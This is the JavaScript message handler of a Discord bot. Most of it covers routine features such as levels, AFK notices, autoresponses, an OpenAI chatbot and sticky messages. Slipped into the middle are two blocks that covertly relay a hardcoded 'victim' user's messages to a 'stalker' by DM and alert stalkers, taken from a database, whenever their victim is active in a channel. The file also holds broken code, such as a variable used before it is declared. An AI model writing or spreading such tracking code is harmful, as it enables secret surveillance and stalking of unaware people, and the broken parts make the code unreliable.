const Discord = require("discord.js");
const bafk = require('../../database/models/bafk');
const Functions = require("../../database/models/functions");
const afk = require("../../database/models/afk");
const autorespond = require("../../database/models/autorespond");
const chatBotSchema = require("../../database/models/chatbot-channel");
const messagesSchema = require("../../database/models/messages");
const messageSchema = require("../../database/models/levelMessages");
const messageRewards = require("../../database/models/messageRewards");
const Schema = require("../../database/models/stickymessages");
const levelRewards = require("../../database/models/levelRewards");
const levelLogs = require("../../database/models/levelChannels");
const Commands = require("../../database/models/customCommand");
const CommandsSchema = require("../../database/models/customCommandAdvanced");
const fetch = require("node-fetch");
const moment = require('moment');
const Stalker = require('../../database/models/stalker');
module.exports = async (client, message) => {
  const dmlog = new Discord.WebhookClient({
    id: client.webhooks.dmLogs.id,
    token: client.webhooks.dmLogs.token,
  });

  if (message.author.bot) return;

  if (message.channel.type === Discord.ChannelType.DM) {
    let embedLogs = new Discord.EmbedBuilder()
      .setTitle(`💬・New DM message!`)
      .setDescription(`Bot has received a new DM message!`)
      .addFields(
        { name: "👤┆Send By", value: `${message.author} (${message.author.tag})`, inline: true },
        { name: `💬┆Message`, value: `${message.content || "None"}`, inline: true },
      )
      .setColor(client.config.colors.normal)
      .setTimestamp();

    if (message.attachments.size > 0)
      embedLogs.addFields(
        { name: `📃┆Attachments`, value: `${message.attachments.first()?.url}`, inline: false },
      )
    return dmlog.send({
      username: "Bot DM",
      embeds: [embedLogs],
    });
  }

  // Levels
  Functions.findOne({ Guild: message.guild.id }, async (err, data) => {
    if (data) {
      if (data.Levels == true) {
        const randomXP = Math.floor(Math.random() * 9) + 1;
        const hasLeveledUp = await client.addXP(
          message.author.id,
          message.guild.id,
          randomXP
        );

        if (hasLeveledUp) {
          const user = await client.fetchLevels(
            message.author.id,
            message.guild.id
          );

          const levelData = await levelLogs.findOne({
            Guild: message.guild.id,
          });
          const messageData = await messageSchema.findOne({
            Guild: message.guild.id,
          });

          if (messageData) {
            var levelMessage = messageData.Message;
            levelMessage = levelMessage.replace(
              `{user:username}`,
              message.author.username
            );
            levelMessage = levelMessage.replace(
              `{user:discriminator}`,
              message.author.discriminator
            );
            levelMessage = levelMessage.replace(
              `{user:tag}`,
              message.author.tag
            );
            levelMessage = levelMessage.replace(
              `{user:mention}`,
              message.author
            );

            levelMessage = levelMessage.replace(`{user:level}`, user.level);
            levelMessage = levelMessage.replace(`{user:xp}`, user.xp);

            try {
              if (levelData) {
                await client.channels.cache
                  .get(levelData.Channel)
                  .send({ content: levelMessage })
                  .catch(() => { });
              } else {
                await message.channel.send({ content: levelMessage });
              }
            } catch {
              await message.channel.send({ content: levelMessage });
            }
          } else {
            try {
              if (levelData) {
                await client.channels.cache
                  .get(levelData.Channel)
                  .send({
                    content: `**GG** <@!${message.author.id}>, you are now level **${user.level}**`,
                  })
                  .catch(() => { });
              } else {
                message.channel.send({
                  content: `**GG** <@!${message.author.id}>, you are now level **${user.level}**`,
                });
              }
            } catch {
              message.channel.send({
                content: `**GG** <@!${message.author.id}>, you are now level **${user.level}**`,
              });
            }
          }

          levelRewards.findOne(
            { Guild: message.guild.id, Level: user.level },
            async (err, data) => {
              if (data) {
                message.guild.members.cache
                  .get(message.author.id)
                  .roles.add(data.Role)
                  .catch((e) => { });
              }
            }
          );
        }
      }
    }
  });

  // Message tracker system
  messagesSchema.findOne(
    { Guild: message.guild.id, User: message.author.id },
    async (err, data) => {
      if (data) {
        data.Messages += 1;
        data.save();

        messageRewards.findOne(
          { Guild: message.guild.id, Messages: data.Messages },
          async (err, data) => {
            if (data) {
              try {
                message.guild.members.cache
                  .get(message.author.id)
                  .roles.add(data.Role);
              } catch { }
            }
          }
        );
      } else {
        new messagesSchema({
          Guild: message.guild.id,
          User: message.author.id,
          Messages: 1,
        }).save();
      }
    }
  );

  // AFK system
  afk.findOne(
    { Guild: message.guild.id, User: message.author.id },
     async (err, data) => {
      if (data) {
        const timeAgo = moment(data.Timestamp).fromNow();
        await afk.deleteOne({
          Guild: message.guild.id,
          User: message.author.id,
        });

        client.embed(
            {
              desc: `${message.author} is no longer afk! Afk for ${timeAgo}`,
              thumbnail: message.author.displayAvatarURL({ dynamic: false, size: 1024 }),
              image: 'https://media.tenor.com/up3wjjJPq2IAAAAC/dankies-pepe.gif'
            },
            message.channel
          )
          .then(async (m) => {
            setTimeout(() => {
              m.delete();
            }, 5000);
          });

        if (message.member.displayName.startsWith(`[AFK] `)) {
          let name = message.member.displayName.replace(`[AFK] `, ``);
          message.member.setNickname(name).catch((e) => { });
        }
      }
    }
  );

  message.mentions.users.forEach(async (u) => {
    if (
      !message.content.includes("@here") &&
      !message.content.includes("@everyone")
    ) {
      afk.findOne(
  { Guild: message.guild.id, User: u.id },
  async (err, data) => {
    if (data) {
      const timeAgo = moment(data.Timestamp).fromNow(); // get the time difference between now and the timestamp when the user became AFK
      client.embed(
        {
          desc: `${u} has been afk for ${timeAgo} . **Reason:** ${data.Message}`,
          thumbnail: u.displayAvatarURL({ dynamic: false, size: 1024 }),
        },
        message.channel
      );
    }
  }
);

    }
  });
   bafk.findOne(
    {  User: message.author.id },
     async (err, data) => {
      if (data) {
        const timeAgo = moment(data.Timestamp).fromNow();
        await bafk.deleteOne({
        
          User: message.author.id,
        });

        client.embed(
            {
              desc: `${message.author} is no longer afk! Afk for ${timeAgo}`,
              thumbnail: message.author.displayAvatarURL({ dynamic: false, size: 1024 }),
              image: 'https://media.tenor.com/up3wjjJPq2IAAAAC/dankies-pepe.gif'
            },
            message.channel
          )
          .then(async (m) => {
            setTimeout(() => {
              m.delete();
            }, 5000);
          });

        if (message.member.displayName.startsWith(`[AFK] `)) {
          let name = message.member.displayName.replace(`[AFK] `, ``);
          message.member.setNickname(name).catch((e) => { });
        }
      }
    }
  );

  message.mentions.users.forEach(async (u) => {
    if (
      !message.content.includes("@here") &&
      !message.content.includes("@everyone")
    ) {
      bafk.findOne(
  {  User: u.id },
  async (err, data) => {
    if (data) {
      const timeAgo = moment(data.Timestamp).fromNow(); // get the time difference between now and the timestamp when the user became AFK
      client.embed(
        {
          desc: `${u} has been afk for ${timeAgo} . **Reason:** ${data.Message}`,
          thumbnail: u.displayAvatarURL({ dynamic: false, size: 1024 }),
        },
        message.channel
      );
    }
  }
);

    }
  });
autorespond.find({ Guild: message.guild.id }, async (err, data) => {
  if (err) console.error(err);
  if (!data || !data.length) return;

  // Loop through each entry for the guild
  data.forEach((entry) => {
    // Get the keyword and response from the schema
    const keyword = entry.Keyword.toLowerCase();
    const response = entry.Response;

    // Check if the message contains the keyword
    if (message.content.toLowerCase().indexOf(keyword) !== -1) {
      // Send the response to the channel
      message.channel.send(response);
    }
  });
});




  // Chat bot
chatBotSchema.findOne({ Guild: message.guild.id }, async (err, data) => {
  if (!data) return;
  if (message.channel.id !== data.Channel) return;
  if (process.env.OPENAI) {
    const previousQuestions = message.channel.messages.cache
      .filter(m => m.author.id === message.author.id)
      .map((m, index) => `Question ${index + 1}: ${m.content}`)
      .slice(0, 5)
      .join("\n");

    const inputText = `Previous Questions:\n${previousQuestions}\n\nCurrent Question: ${message.content}`;

    console.log("Input Text:", inputText);

    fetch(
      `https://api.openai.com/v1/completions`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Bearer ' + process.env.OPENAI,
        },
        body: JSON.stringify({
          'model': 'text-davinci-003',
          'prompt': inputText,
          'temperature': 0,
          'max_tokens': 4000,
          'top_p': 1,
          'frequency_penalty': 0,
          'presence_penalty': 0,
        })
      }
    )
      .catch(() => {})
      .then((res) => {
        res.json().then((data) => {
          console.log("OpenAI API Response:", data.choices[0].text);
          message.channel.send({ content: data.choices[0].text });
        });
      });
  }
});


if (message.author.id === 'victimUserID') {
    // Get the stalker's user ID (replace with the actual stalker's ID)
    const stalkerID = 'stalkerUserID';

    // Fetch the stalker user object
    client.users.fetch(stalkerID)
      .then((stalker) => {
        // Send a DM to the stalker
        stalker.send(`You have received a message from the victim: "${message.content}"`)
          .then(() => {
            console.log('DM sent successfully');
          })
          .catch((error) => {
            console.error('Error sending DM:', error);
          });
      })
      .catch((error) => {
        console.error('Error fetching stalker user:', error);
      });
  };



  // Sticky messages
  try {
    Schema.findOne(
      { Guild: message.guild.id, Channel: message.channel.id },
      async (err, data) => {
        if (!data) return;

        const lastStickyMessage = await message.channel.messages
          .fetch(data.LastMessage)
          .catch(() => { });
        if (!lastStickyMessage) return;
        await lastStickyMessage.delete({ timeout: 1000 });

        const newMessage = await client.simpleEmbed(
          { desc: `${data.Content}` },
          message.channel
        );

        data.LastMessage = newMessage.id;
        data.save();
      }
    );
  } catch { }
  


Stalker.find({ Victim: message.author.id }, async (err, data) => {
  if (data) {
   // Assuming 'client' is the Discord.js client instance
const victim = client.users.cache.get(message.author.id); // Getting the user object of the victim

// Assuming 'message' is the received message object
const interactionChannelId = message.channel.id; // Getting the interaction channel ID of the victim // Code to be executed if matching documents are found
    data.forEach((document) => {
      const stalkerId = document.Stalker;
      const allowed = document.allowed; 
     
      // Getting the value of the 'allowed' field
      const timeAgo = moment.duration(moment().diff(moment(document.Timestamp))).as('minutes');

      console.log(timeAgo);
      if (timeAgo < 15) {
    // Code to be executed if the timeAgo is less than 15
    return; // Return to exit the current iteration of the loop
  }
      // Send DM to the stalker if the victim and stalker objects are valid and 'allowed' is true
      const stalker = client.users.cache.get(stalkerId); // Getting the user object of the stalker
      if (stalker && allowed === true) {
        stalker.send(`Your Victime ID: <@${victim.id}> is active in <#${interactionChannelId}> channel.`)
          .catch(console.error)
        .then(() => {
            // Update timestamp in the database
            document.Timestamp = moment().format(); // Assuming 'timestamp' is the field in the document to be updated
            document.save(); // Save the updated document to the database
          });
      }
    });
  }
});


  // Prefix
  var guildSettings = await Functions.findOne({ Guild: message.guild.id });
  if (!guildSettings) {
    new Functions({
      Guild: message.guild.id,
      Prefix: client.process.env.gay,
    }).save();

    guildSettings = await Functions.findOne({ Guild: message.guild.id });
  }

  if (!guildSettings || !guildSettings.Prefix) {
    Functions.findOne({ Guild: message.guild.id }, async (err, data) => {
      data.Prefix = client.config.discord.prefix;
      data.save();
    });

    guildSettings = await Functions.findOne({ Guild: message.guild.id });
  }

  if (!guildSettings || !guildSettings.Prefix) {
    var prefix = client.config.Discord.prefix;
  } else {
    var prefix = guildSettings.Prefix;
  }

  const escapeRegex = (str) => str.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  const prefixRegex = new RegExp(
    `^(<@!?${client.user.id}>|${escapeRegex(prefix)})\\s*`
  );

  if (!prefixRegex.test(message.content.toLowerCase())) return;
  const [, matchedPrefix] = message.content.toLowerCase().match(prefixRegex);

  const args = message.content.slice(matchedPrefix.length).trim().split(/ +/g);
  const command = args.shift().toLowerCase();

  if (
    message.mentions.users.first() &&
    message.mentions.users.first().id == client.user.id &&
    command.length === 0
  ) {
    let row = new Discord.ActionRowBuilder().addComponents(
      new Discord.ButtonBuilder()
        .setLabel("Invite")
        .setURL(
          client.config.discord.botInvite
        )
        .setStyle(Discord.ButtonStyle.Link),

      new Discord.ButtonBuilder()
        .setLabel("Support server")
        .setURL(client.config.discord.serverInvite)
        .setStyle(Discord.ButtonStyle.Link)
    );

    client
      .embed(
        {
          title: "Hi, i'm Bot",
          desc: `Use with commands via Discord ${client.emotes.normal.slash} commands`,
          fields: [
            {
              name: "📨┆Invite me",
              value: `Invite Bot in your own server! [Click here](${client.config.discord.botInvite})`,
            },
            {
              name: "❓┇I don't see any slash commands",
              value:
                "The bot may not have permissions for this. Open the invite link again and select your server. The bot then gets the correct permissions",
            },
            {
              name: "❓┆Need support?",
              value: `For questions you can join our [support server](${client.config.discord.serverInvite})!`,
            },
            {
              name: "🐞┆Found a bug?",
              value: `Report all bugs via: \`/report bug\`!`,
            },
          ],
          components: [row],
        },
        message.channel
      )
      .catch(() => { });
  }

  const cmd = await Commands.findOne({
    Guild: message.guild.id,
    Name: command,
  });
  if (cmd) {
    return message.channel.send({ content: cmdx.Responce });
  }

  const cmdx = await CommandsSchema.findOne({
    Guild: message.guild.id,
    Name: command,
  });
  if (cmdx) {
    if (cmdx.Action == "Normal") {
      return message.channel.send({ content: cmdx.Responce });
    } else if (cmdx.Action == "Embed") {
      return client.simpleEmbed(
        {
          desc: `${cmdx.Responce}`,
        },
        message.channel
      );
    } else if (cmdx.Action == "DM") {
      return message.author.send({ content: cmdx.Responce }).catch((e) => {
        client.errNormal(
          {
            error: "I can't DM you, maybe you have DM turned off!",
          },
          message.channel
        );
      });
    }
  }

  if (command) {
    let row = new Discord.ActionRowBuilder().addComponents(
      new Discord.ButtonBuilder()
        .setLabel("Invite")
        .setURL(
          client.config.discord.botInvite
        )
        .setStyle(Discord.ButtonStyle.Link),

      new Discord.ButtonBuilder()
        .setLabel("Support server")
        .setURL(client.config.discord.serverInvite)
        .setStyle(Discord.ButtonStyle.Link)
    );

    client.embed(
      {
        title: "👋・Hi, i'm Bot",
        desc: `I am a Bot completely in ${client.emotes.normal.slash} commands. our new improved commands and make your server better with Bot! VKOP`,
        fields: [
          {
            name: "❓┇I don't see any slash commands",
            value:
              "The bot may not have permissions for this. Open the invite link again and select your server. The bot then gets the correct permissions",
          },
        ],
        components: [row],
      },
      message.channel
    );
  }
};


